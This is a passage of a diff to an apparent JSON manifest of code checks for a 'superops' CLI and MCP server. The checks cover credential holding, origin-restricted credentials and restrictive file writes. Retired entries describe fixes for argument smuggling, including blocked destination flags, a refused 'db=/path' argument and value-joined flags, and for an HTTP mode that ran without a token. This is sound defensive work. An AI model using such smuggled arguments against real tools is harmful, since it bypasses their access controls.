+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/superops_input_sources_test.go",
+     "contains": "func TestEveryInputReaderHoldsWhatItReadsOrIsNamed(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/superops_credential_holder_test.go",
+     "contains": "func TestURLUserinfoSecretsSkipsAShortUsernameBesideAPassword(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_echo_encodings_e2e_test.go",
+     "contains": "func TestEchoedCredentialIsWithheldInEveryEncoding(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/superops_held_write.go",
+     "contains": "func HeldAtomicWrite(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "cliutil.HeldAtomicWrite(filepath.Join(dir, journalOffsetFileName), data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "credkit.WriteFile(tempName, []byte(scopeHash+\"\\n\"), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/ratelimit.go",
+     "contains": "credkit.WriteFile(path, []byte(strconv.FormatInt(time.Now().UnixNano(), 10)), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "credkit.WriteFile(path, key, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_held_whole_e2e_test.go",
+     "contains": "func TestJournalOffsetPassesTheKit(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func selectKitBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "Allowed: []string{\"base_url\"}},",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "func holdProfileStores(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "restoreBaseURLEnv()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cfg.BaseURL = routedBaseURL(cfg.BaseURL, cfg.Region)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/superops_credential_holder.go",
+     "contains": "func SelectedBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "allowed := savableProfileFlags()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "func savableProfileFlags()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations_origin_test.go",
+     "contains": "func TestCredentialsGoOnlyToTheSelectedBaseURL(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_origin_and_stdin_e2e_test.go",
+     "contains": "func TestACredentialGoesOnlyToTheSelectedOrigin(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_origin_and_stdin_e2e_test.go",
+     "contains": "func TestABodysCredentialFieldsAreHeldBeforeItPrints(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_origin_and_stdin_e2e_test.go",
+     "contains": "func TestASavedProfileIsHeldAtStartup(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/raw.go",
+     "contains": "credkit.HoldBody([]byte(raw))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "credkit.HoldBody(opened.Data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/superops-mcp/superops_origin_and_stdin_e2e_test.go",
+     "contains": "func TestAConfigThatDoesNotParseIsHeldAtStartup(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
   }
  ]
 }
